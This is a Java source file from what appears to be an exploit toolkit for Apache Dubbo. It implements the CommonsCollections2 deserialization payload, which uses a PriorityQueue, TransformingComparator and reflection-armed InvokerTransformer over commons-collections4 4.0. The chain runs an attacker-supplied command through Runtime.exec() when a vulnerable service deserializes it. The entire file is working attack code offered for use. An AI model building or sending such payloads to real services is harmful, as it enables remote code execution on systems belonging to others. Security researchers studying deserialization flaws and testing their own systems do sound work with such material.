package com.threedr3am.exp.dubbo.payload.java;

import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.Gadgets;
import com.threedr3am.exp.dubbo.utils.Reflections;
import java.util.PriorityQueue;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;


/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */

/**
 * org.apache.commons:commons-collections4:4.0
 */
public class CommonsCollections2 implements Payload {

	private String[] args;

	/**
	 *
	 * @param args
	 *
	 * arg[0]=cmd
	 *
	 * @return
	 * @throws Exception
	 */
	@Override
	public Object getPayload(String[] args) throws Exception {
		if (this.args != null)
			args = this.args;
		final Object templates = Gadgets.createTemplatesImpl(args[0]);
		// mock method name until armed
		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
		// stub data for replacement later
		queue.add(1);
		queue.add(1);

		// switch method called by comparator
		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = 1;

		return queue;
	}

	@Override
	public void injectDefaultArgs(String[] args) {
		this.args = args;
	}

}
